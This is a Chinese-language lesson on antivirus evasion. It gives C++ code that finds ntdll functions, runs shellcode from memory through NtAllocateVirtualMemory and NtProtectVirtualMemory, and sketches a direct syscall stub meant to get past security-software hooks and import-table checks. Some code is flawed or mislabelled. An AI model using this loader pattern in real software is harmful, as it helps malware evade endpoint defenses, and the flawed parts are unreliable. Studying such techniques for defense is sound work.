# 课时03：未导出API执行ShellCode

## 1. 课程概述

### 1.1 学习目标

通过本课时的学习，你将掌握：
- 理解Windows导出表与未导出API的区别
- 掌握动态获取未导出API地址的方法
- 学会使用未导出API执行ShellCode
- 理解如何绕过导入表检测

### 1.2 前置知识

- PE文件结构基础
- Windows API调用机制
- 内存操作基础

---

## 2. 名词解释

### 2.1 核心术语

| 术语 | 英文 | 说明 |
|------|------|------|
| **导出API** | Exported API | 在DLL导出表中公开的函数，可通过GetProcAddress获取 |
| **未导出API** | Unexported/Private API | 未在导出表中公开的内部函数 |
| **IAT** | Import Address Table | 导入地址表，存储程序使用的外部函数地址 |
| **EAT** | Export Address Table | 导出地址表，DLL导出的函数列表 |
| **Ntdll.dll** | NT层DLL | Windows最底层的用户态DLL，包含系统调用接口 |
| **Syscall** | 系统调用 | 从用户态进入内核态的机制 |

### 2.2 API调用层次

```
应用程序
    ↓
kernel32.dll (CreateFile, VirtualAlloc...)
    ↓
kernelbase.dll (实际实现)
    ↓
ntdll.dll (NtCreateFile, NtAllocateVirtualMemory...)
    ↓
syscall (进入内核)
    ↓
Windows内核
```

### 2.3 为什么使用未导出API

1. **绕过IAT Hook**：安全软件通常Hook导出API
2. **绕过导入表检测**：不在导入表中留下痕迹
3. **调用更底层的功能**：绕过高层安全检查

---

## 3. 必备工具

| 工具 | 用途 | 下载地址 |
|------|------|----------|
| **IDA Pro/Ghidra** | 分析DLL找到未导出函数 | - |
| **WinDbg** | 调试并查找函数地址 | Microsoft官网 |
| **x64dbg** | 动态调试 | https://x64dbg.com/ |
| **PE-bear/CFF Explorer** | PE文件分析 | - |
| **API Monitor** | 监控API调用 | http://www.rohitab.com/apimonitor |

---

## 4. 技术原理

### 4.1 导出API vs 未导出API

| 特性 | 导出API | 未导出API |
|------|----------|------------|
| 在导出表中 | ✔ | ✘ |
| GetProcAddress可获取 | ✔ | ✘ |
| 文档说明 | 通常有 | 通常无 |
| 稳定性 | 相对稳定 | 可能随版本变化 |
| 检测风险 | 较高 | 较低 |

### 4.2 获取未导出API的方法

1. **特征码搜索**：在内存中搜索函数特征
2. **偏移计算**：基于已知函数计算偏移
3. **符号文件**：通过调试符号查找
4. **硬编码偏移**：针对特定版本的固定偏移

---

## 5. 实现代码

### 5.1 方法1：特征码搜索

```cpp
#include <windows.h>
#include <stdio.h>

// 在内存中搜索特征码
PVOID SearchPattern(PVOID pStart, SIZE_T size, PBYTE pattern, SIZE_T patternLen) {
    PBYTE pCurrent = (PBYTE)pStart;
    PBYTE pEnd = pCurrent + size - patternLen;
    
    while (pCurrent <= pEnd) {
        BOOL found = TRUE;
        for (SIZE_T i = 0; i < patternLen; i++) {
            if (pattern[i] != 0xCC && pCurrent[i] != pattern[i]) {
                found = FALSE;
                break;
            }
        }
        if (found) return pCurrent;
        pCurrent++;
    }
    return NULL;
}

// 获取ntdll.dll中的未导出函数
PVOID GetUnexportedFunction(LPCSTR szFunctionPattern, SIZE_T patternLen) {
    // 获取ntdll基址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    
    // 获取模块信息
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    
    // 获取代码段
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            PVOID pCode = (PBYTE)hNtdll + pSection[i].VirtualAddress;
            SIZE_T codeSize = pSection[i].Misc.VirtualSize;
            
            return SearchPattern(pCode, codeSize, 
                                 (PBYTE)szFunctionPattern, patternLen);
        }
    }
    return NULL;
}

int main() {
    printf("[*] Searching for unexported function...\n");
    
    // 示例：搜索某个函数的特征字节
    // 这里需要根据实际函数填写
    BYTE pattern[] = { 0x4C, 0x8B, 0xD1, 0xB8 };  // 示例特征
    
    PVOID pFunc = GetUnexportedFunction((LPCSTR)pattern, sizeof(pattern));
    
    if (pFunc) {
        printf("[+] Found function at: 0x%p\n", pFunc);
    } else {
        printf("[-] Function not found\n");
    }
    
    return 0;
}
```

### 5.2 方法2：基于导出函数偏移

```cpp
#include <windows.h>
#include <stdio.h>

// 通过已知导出函数计算未导出函数地址
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

PVOID GetNtFunctionByOffset(LPCSTR szKnownFunc, LONG offset) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    
    PVOID pKnown = GetProcAddress(hNtdll, szKnownFunc);
    if (!pKnown) return NULL;
    
    return (PBYTE)pKnown + offset;
}

int main() {
    printf("[*] Getting unexported function by offset...\n");
    
    // 示例：假设目标函数在NtAllocateVirtualMemory后0x100字节
    // 实际偏移需要通过逆向分析确定
    PVOID pUnexported = GetNtFunctionByOffset("NtAllocateVirtualMemory", 0x100);
    
    printf("[*] Unexported function at: 0x%p\n", pUnexported);
    
    return 0;
}
```

### 5.3 方法3：动态解析符号

```cpp
#include <windows.h>
#include <dbghelp.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")

PVOID GetFunctionBySymbol(LPCSTR szModule, LPCSTR szFunction) {
    HANDLE hProcess = GetCurrentProcess();
    
    // 初始化符号处理
    SymInitialize(hProcess, NULL, TRUE);
    
    // 获取模块基址
    HMODULE hModule = GetModuleHandleA(szModule);
    if (!hModule) {
        printf("[-] Module not found\n");
        return NULL;
    }
    
    // 查找符号
    SYMBOL_INFO symbol = { 0 };
    symbol.SizeOfStruct = sizeof(SYMBOL_INFO);
    
    if (SymFromName(hProcess, szFunction, &symbol)) {
        printf("[+] Found %s at: 0x%llx\n", szFunction, symbol.Address);
        SymCleanup(hProcess);
        return (PVOID)symbol.Address;
    }
    
    printf("[-] Symbol not found\n");
    SymCleanup(hProcess);
    return NULL;
}

int main() {
    PVOID pFunc = GetFunctionBySymbol("ntdll.dll", "RtlpAllocateHeap");
    return 0;
}
```

---

## 6. 实战：使用未导出API执行ShellCode

### 6.1 使用NtAllocateVirtualMemory

```cpp
#include <windows.h>
#include <stdio.h>

// 定义Nt函数类型
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// ShellCode示例 (x64 MessageBox)
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,       // sub rsp, 0x28
    0x48, 0x31, 0xC9,             // xor rcx, rcx
    0x48, 0x31, 0xD2,             // xor rdx, rdx
    0x4D, 0x31, 0xC0,             // xor r8, r8
    0x4D, 0x31, 0xC9,             // xor r9, r9
    // ... 省略实际ShellCode ...
    0x48, 0x83, 0xC4, 0x28,       // add rsp, 0x28
    0xC3                          // ret
};

int main() {
    printf("========== Unexported API ShellCode Execution ==========\n");
    
    // 动态获取Nt函数
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = 
        (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    
    pNtProtectVirtualMemory NtProtectVirtualMemory = 
        (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    
    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory) {
        printf("[-] Failed to get Nt functions\n");
        return 1;
    }
    
    printf("[+] NtAllocateVirtualMemory: 0x%p\n", NtAllocateVirtualMemory);
    printf("[+] NtProtectVirtualMemory: 0x%p\n", NtProtectVirtualMemory);
    
    // 分配内存
    PVOID pMemory = NULL;
    SIZE_T size = sizeof(shellcode);
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &pMemory,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
        return 1;
    }
    
    printf("[+] Memory allocated at: 0x%p\n", pMemory);
    
    // 复制ShellCode
    memcpy(pMemory, shellcode, sizeof(shellcode));
    
    // 修改内存属性为可执行
    ULONG oldProtect;
    SIZE_T regionSize = sizeof(shellcode);
    
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &pMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );
    
    if (status != 0) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
        return 1;
    }
    
    printf("[+] Memory protection changed to EXECUTE_READ\n");
    
    // 执行ShellCode
    printf("[*] Executing ShellCode...\n");
    ((void(*)())pMemory)();
    
    return 0;
}
```

### 6.2 直接Syscall调用（跳过ntdll）

```cpp
#include <windows.h>
#include <stdio.h>

// x64 Syscall定义
extern "C" NTSTATUS NtAllocateVirtualMemorySyscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// 汇编实现 (syscall.asm)
/*
.code
NtAllocateVirtualMemorySyscall proc
    mov r10, rcx
    mov eax, 18h        ; Windows 10 syscall number
    syscall
    ret
NtAllocateVirtualMemorySyscall endp
end
*/

// 内联汇编版本 (MSVC x64不支持内联汇编)
// 需要单独的.asm文件
```

---

## 7. 免杀应用场景

### 7.1 绕过API Hook

```
常规调用路径 (容易被Hook):
VirtualAlloc -> kernel32!VirtualAlloc [HOOK] -> ntdll!NtAllocateVirtualMemory

绕过Hook的路径:
直接调用 -> ntdll!NtAllocateVirtualMemory (GetProcAddress获取)

更彻底的绕过:
直接syscall (跳过ntdll)
```

### 7.2 绕过导入表检测

当使用GetProcAddress动态获取函数时，不会在程序的导入表中留下记录，让静态分析更困难。

---

## 8. 编译与测试

### 8.1 编译命令

```bash
# MSVC
cl.exe /EHsc unexported.cpp /Fe:unexported.exe

# 带符号支持
cl.exe /EHsc /Zi unexported.cpp dbghelp.lib /Fe:unexported.exe
```

### 8.2 测试步骤

1. 运行程序确认函数地址获取成功
2. 使用x64dbg验证地址正确性
3. 使用API Monitor确认没有调用高层API

---

## 9. 课后作业

### 9.1 基础练习

1. 使用GetProcAddress获取NtWriteVirtualMemory地址
2. 使用Nt函数实现内存分配和ShellCode执行

### 9.2 进阶练习

1. 实现特征码搜索获取未导出函数
2. 尝试编写直接syscall调用

### 9.3 思考题

1. 安全软件如何检测直接syscall调用？
2. 未导出API的稳定性问题如何解决？

---

## 10. 下一课预告

下一课我们将学习**“遍历内存块执行ShellCode”**，通过遍历进程内存寻找可执行区域。
